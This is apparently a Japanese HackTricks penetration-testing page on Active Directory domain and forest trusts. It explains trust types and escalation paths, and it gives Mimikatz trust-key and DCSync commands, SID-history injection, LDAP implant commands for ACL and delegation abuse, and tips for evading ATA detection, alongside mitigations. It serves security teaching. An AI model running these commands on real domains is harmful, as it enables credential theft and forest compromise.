Microsoftは**Forest**をセキュリティの境界と見なしています。つまり、**単一ドメインの侵害がフォレスト全体の侵害につながる可能性がある**ということです。

### 基本情報

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)は、ある**ドメイン**のユーザーが別の**ドメイン**のリソースにアクセスできるようにするセキュリティメカニズムです。これは両ドメインの認証システム間に連携を作り、認証情報の検証がシームレスに流れるようにします。ドメイン間のトラストが設定されると、特定の**キー**が両方の**Domain Controller (DC)**に交換・保持され、トラストの整合性に重要な役割を果たします。

典型的なシナリオでは、ユーザーが**trusted domain**内のサービスにアクセスしようとすると、まず自ドメインのDCから**inter-realm TGT**と呼ばれる特別なチケットを要求する必要があります。このTGTは、両ドメインが合意した共有の**trust key**で暗号化されます。ユーザーはこのTGTを**trusted domain**のDCに提示してTGS（サービスチケット）を取得します。trusted domainのDCがinter-realm TGTを検証すると、ユーザーに目的のサービス向けのTGSを発行し、ユーザーはそれを使ってサービスにアクセスできます。

**手順**:

1. **Domain 1**のクライアントコンピュータが、自身の**NTLM hash**を使って**Domain Controller (DC1)**に**Ticket Granting Ticket (TGT)**を要求してプロセスを開始します。
2. クライアントが正常に認証されると、DC1は新しいTGTを発行します。
3. クライアントは次に、**Domain 2**のリソースにアクセスするのに必要な**inter-realm TGT**をDC1から要求します。
4. inter-realm TGTは、双方向のドメイントラストの一部としてDC1とDC2の間で共有される**trust key**で暗号化されます。
5. クライアントはinter-realm TGTを**Domain 2のDomain Controller (DC2)**に持って行きます。
6. DC2は共有されているtrust keyを使ってinter-realm TGTを検証し、正当であればクライアントがアクセスしたいDomain 2内のサーバ向けに**Ticket Granting Service (TGS)**を発行します。
7. 最後に、クライアントはこのTGSをサーバに提示します。TGSはサーバのアカウントハッシュで暗号化されており、それを用いてDomain 2内のサービスへのアクセスが与えられます。

### Different trusts

重要なのは、**トラストは一方向（1-way）または双方向（2-way）になり得る**という点です。双方向トラストでは両ドメインが相互に信頼しますが、**1-way**トラスト関係では一方のドメインが**trusted**で、他方が**trusting**ドメインになります。この場合、**trusted側からtrusting側のリソースにのみアクセス可能**です。

もしDomain AがDomain Bを信頼している場合、Aはtrusting domainでBはtrusted domainです。さらに、**Domain A**ではこれは**Outbound trust**となり、**Domain B**では**Inbound trust**となります。

**異なる信頼関係の種類**

- **Parent-Child Trusts**: 同一フォレスト内で一般的な設定で、子ドメインは自動的に親ドメインと双方向のトランジティブトラストを持ちます。つまり親と子の間で認証要求がシームレスに流れます。
- **Cross-link Trusts**: 「ショートカットトラスト」とも呼ばれ、子ドメイン間で参照処理を高速化するために確立されます。複雑なフォレストでは認証の参照がルートまで上がってからターゲットドメインまで降りる必要がありますが、クロスリンクを作成すると経路が短くなり、地理的に分散した環境で特に有効です。
- **External Trusts**: 無関係の別ドメイン間に設定され、非トランジティブです。[Microsoftのドキュメント](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)によれば、external trustsはフォレストトラストで繋がっていない外部ドメインのリソースにアクセスする際に有用です。セキュリティ強化のためにSIDフィルタリングが適用されます。
- **Tree-root Trusts**: フォレストルートドメインと新しく追加されたツリールートの間で自動的に確立されます。一般的ではありませんが、フォレストに新しいドメインツリーを追加する際に重要で、2方向の推移性を維持します。詳細は[Microsoftのガイド](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)を参照してください。
- **Forest Trusts**: これは2つのフォレストルートドメイン間の双方向トランジティブトラストで、SIDフィルタリングを強制してセキュリティを高めます。
- **MIT Trusts**: これは非Windowsの[RFC4120準拠](https://tools.ietf.org/html/rfc4120)のKerberosドメインとの間に確立されるトラストです。MIT trustsはやや専門的で、Windows以外のKerberosベースのシステムと統合する必要がある環境向けです。

#### Other differences in **trusting relationships**

- トラスト関係は**トランジティブ**（AはBを、BはCを信頼するとAはCを信頼する）または**非トランジティブ**に設定できます。
- トラスト関係は**双方向（bidirectional）**（双方が互いを信頼）または**一方向（one-way）**（一方のみがもう一方を信頼）として設定できます。

### Attack Path

1. **Enumerate**してトラスト関係を列挙する
2. どの**security principal**（user/group/computer）が**他ドメインのリソースにアクセス**できるかを確認する。ACEエントリや他ドメインのグループに属しているかを調べる。**ドメイン間の関係**を探せ（トラストがこれを目的に作成されていることがある）。
1. この場合、kerberoastも別のオプションになり得る。
3. ドメイン間を**ピボット**できるアカウントを**compromise**する。

攻撃者が他ドメイン内のリソースにアクセスする主なメカニズムは次の3つです：

- **Local Group Membership**: プリンシパルがサーバ上の“Administrators”などのローカルグループに追加されている場合、そのマシンを大きく制御する権限を得ます。
- **Foreign Domain Group Membership**: プリンシパルが外部ドメイン内のグループのメンバーである場合もあります。ただし、この方法の有効性はトラストの性質やグループのスコープに依存します。
- **Access Control Lists (ACLs)**: 特定のリソースへのアクセスを与えるように、DACL内のACEとしてプリンシパルが指定されていることがあります。ACL、DACL、ACEの仕組みに深く入りたい場合は、白書「An ACE Up The Sleeve」(https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)が非常に有益です。

### Find external users/groups with permissions

ドメイン内の外部セキュリティプリンシパルを見つけるには、**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** を確認できます。これらは**外部ドメイン／フォレスト**からのユーザ／グループです。

これは **Bloodhound** や powerview を使って確認できます：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent フォレストの privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメイン信頼を列挙する他の方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 子ドメイン --> 親ドメイン 用と親ドメイン --> 子ドメイン 用の**2つの trusted keys**があります。\
> 現在のドメインで使用されているキーは次のコマンドで確認できます:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection を悪用して、trust を利用し child/parent ドメインに対して Enterprise admin に昇格します:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) がどのように悪用され得るかを理解することは重要です。Configuration NC は Active Directory (AD) 環境におけるフォレスト全体の設定データの中央リポジトリとして機能します。このデータはフォレスト内のすべての Domain Controller (DC) にレプリケートされ、書き込み可能な DC は Configuration NC の書き込み可能なコピーを保持します。これを悪用するには、**DC 上での SYSTEM 権限**（できれば child DC）が必要です。

**Link GPO to root DC site**

Configuration NC の Sites コンテナには、AD フォレスト内のすべてのドメイン参加コンピュータのサイト情報が含まれています。任意の DC 上で SYSTEM 権限を持って操作することで、攻撃者は GPO を root DC のサイトにリンクすることができます。この操作により、これらのサイトに適用されるポリシーを操作して root ドメインを侵害する可能性があります。

詳細については、[Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) の研究を参照してください。

**Compromise any gMSA in the forest**

攻撃ベクターとして、ドメイン内の特権的な gMSA を標的にすることが考えられます。gMSA のパスワード計算に必要な KDS Root key は Configuration NC に格納されています。任意の DC 上で SYSTEM 権限を持てば、KDS Root key にアクセスし、フォレスト内の任意の gMSA のパスワードを計算することが可能です。

詳細な解析とステップバイステップの手順は以下を参照してください:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補完的な delegated MSA アタック（BadSuccessor – migration 属性の悪用）:


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

追加の外部研究: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

この手法は新しく作成される特権 AD オブジェクトを待つ必要があるため忍耐を要します。SYSTEM 権限があれば、攻撃者は AD Schema を変更して任意のユーザにすべてのクラスに対する完全なコントロールを付与することができます。これにより、新たに作成される AD オブジェクトに対する不正なアクセスと制御が可能になります。

詳しくは [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent) を参照してください。

**From DA to EA with ADCS ESC5**

ADCS ESC5 脆弱性は、PKI オブジェクトを制御して任意のユーザとして認証可能にする証明書テンプレートを作成することを目的としています。PKI オブジェクトは Configuration NC に存在するため、書き込み可能な child DC を侵害することで ESC5 攻撃を実行できます。

詳細は [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) を参照してください。ADCS が存在しない環境でも、攻撃者は必要なコンポーネントを構築することが可能であり、詳しくは [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) を参照してください。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは、**あなたのドメインが外部ドメインに信頼されており**、外部ドメイン上での**権限は不確定**です。**自ドメインのどのプリンシパルが外部ドメインにどのようなアクセス権を持っているか**を特定し、それを悪用する必要があります:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレストドメイン - 一方向 (アウトバウンド)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
このシナリオでは **あなたのドメイン** が **異なるドメイン** のプリンシパルにいくつかの **特権** を信頼しています。

しかし、あるドメインが信頼されると、信頼されたドメインは予測可能な名前のユーザーを作成し、そのパスワードとして信頼されたパスワードを使用します。つまり、信頼元ドメインのユーザーにアクセスして信頼先ドメイン内に入り、列挙してさらに権限昇格を試みることが可能になります：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

信頼先ドメインを侵害する別の方法は、ドメイントラストの逆方向に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることです（これはあまり一般的ではありません）。

また別の方法として、信頼先ドメインのユーザーがRDPでログインできるマシンに待機することがあります。攻撃者はRDPセッションのプロセスにコードを注入し、そこから被害者の元ドメインにアクセスできます。さらに、被害者がハードドライブをマウントしていた場合、RDPセッションのプロセスからハードドライブのスタートアップフォルダに backdoors を格納することが可能です。この手法は **RDPInception** と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### ドメイントラスト悪用の緩和

### **SID Filtering:**

- SID history 属性を跨ぐフォレスト間トラストを悪用した攻撃のリスクは、SID Filtering によって軽減されます。SID Filtering はすべてのフォレスト間トラストでデフォルトで有効になっています。これは Microsoft の立場に従い、セキュリティ境界をドメインではなくフォレストと見なす前提に基づいています。
- ただし注意点として、SID Filtering はアプリケーションやユーザーアクセスを阻害することがあり、そのため一時的に無効化される場合があります。

### **Selective Authentication:**

- フォレスト間トラストでは、Selective Authentication を導入することで、両フォレストのユーザーが自動的に認証されることを防げます。代わりに、信頼するドメインやフォレスト内のドメインやサーバーへアクセスするには明示的な権限が必要になります。
- ただし、これらの対策は writable Configuration Naming Context (NC) の悪用やトラストアカウントに対する攻撃からは保護しない点に注意してください。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は bloodyAD-style な LDAP プリミティブを x64 Beacon Object Files として再実装し、オンホストインプラント内（例：Adaptix C2）で完全に実行されます。オペレーターはパックを `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` でコンパイルし、`ldap.axs` をロードしてビーコンから `ldap <subcommand>` を呼び出します。すべてのトラフィックは現在のログオンセキュリティコンテキストで LDAP (389) の署名/シーリング、または自動証明書信頼付きの LDAPS (636) を経由するため、socks プロキシやディスク上の痕跡は不要です。

### インプラント側 LDAP 列挙

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, および `get-groupmembers` は短縮名や OU パスを完全な DN に解決し、対応するオブジェクトをダンプします。
- `get-object`, `get-attribute`, および `get-domaininfo` は任意の属性（セキュリティ記述子を含む）と `rootDSE` からのフォレスト/ドメインメタデータを取得します。
- `get-uac`, `get-spn`, `get-delegation`, および `get-rbcd` は roasting candidates、delegation 設定、そして LDAP から直接取得できる既存の [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 記述子を明らかにします。
- `get-acl` と `get-writable --detailed` は DACL を解析してトラスティー (trustees)、権利（GenericAll/WriteDACL/WriteOwner/attribute writes）、および継承を列挙し、ACL による権限昇格の即時ターゲットを提供します。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### エスカレーションと持続化のための LDAP 書き込みプリミティブ

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) により、オペレーターは OU 権限がある場所に新しいプリンシパルやマシンアカウントを配置できます。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は、write-property 権限を得た場合にターゲットを直接乗っ取ります。
- `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync` のような ACL 中心のコマンドは、任意の AD オブジェクトに対する WriteDACL/WriteOwner を、PowerShell/ADSI のアーティファクトを残さずにパスワードリセット、グループメンバーシップの制御、または DCSync レプリケーション権限へと変換します。`remove-*` 対応コマンドは注入した ACE をクリーンアップします。

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` は、侵害されたユーザーを即座に Kerberoastable にします。`add-asreproastable`（UAC トグル）はパスワードに触れずに AS-REP roasting の対象としてマークします。
- Delegation マクロ（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は、beacon から `msDS-AllowedToDelegateTo`、UAC フラグ、または `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換え、constrained/unconstrained/RBCD の攻撃経路を有効にし、リモート PowerShell や RSAT の必要性を排します。

### sidHistory 注入、OU 移動、および攻撃面の整形

- `add-sidhistory` は、権限を持つ SID を制御下のプリンシパルの SID history に注入します（参照: [SID-History Injection](sid-history-injection.md)）。これにより LDAP/LDAPS のみでステルスにアクセス継承を得られます。
- `move-object` はコンピューターやユーザーの DN/OU を変更し、攻撃者が既に委任権が存在する OU に資産を移動させてから `set-password`、`add-groupmember`、`add-spn` を悪用できるようにします。
- `remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` などの範囲を限定した削除コマンドにより、オペレーターが資格情報や永続化を回収した後に迅速にロールバックでき、テレメトリを最小化します。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御策

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **資格情報保護のための防御策**

- **Domain Admins Restrictions**: Domain Admins は Domain Controllers へのログオンのみに制限し、他のホストでの使用は避けることを推奨します。
- **Service Account Privileges**: サービスは Domain Admin (DA) 権限で実行すべきではありません。
- **Temporal Privilege Limitation**: DA 権限を要する作業はその期間を限定すべきです。例: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 を監査し、その後 DC/クライアントで LDAP signing と LDAPS channel binding を強制して LDAP MITM/relay の試行を阻止します。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **欺瞞（Deception）技術の実装**

- 欺瞞の実装は、パスワードが期限切れにならない、または Trusted for Delegation とマークされたデコイユーザーやコンピューターなどのトラップを設置することを含みます。具体的には特定の権利を持つユーザーを作成したり、高権限グループに追加したりします。
- 実用的な例: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 欺瞞技術の導入に関する詳細は [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) を参照してください。

### **欺瞞の識別**

- **For User Objects**: 疑わしい指標には、異常な ObjectSID、ログオン頻度の低さ、作成日時、低い bad password count などがあります。
- **General Indicators**: 潜在的なデコイオブジェクトの属性を実際のオブジェクトと比較することで不整合が明らかになります。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) のようなツールが識別に役立ちます。

### **検出システムの回避**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA 検出を避けるために Domain Controllers 上でのセッション列挙を避けます。
- **Ticket Impersonation**: チケット作成に **aes** キーを使用すると、NTLM にダウングレードしないため検出を回避しやすくなります。
- **DCSync Attacks**: Domain Controller 以外から実行することで ATA 検出を回避することが推奨されます。Domain Controller 上から直接実行するとアラートが発生します。

## 参考文献

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
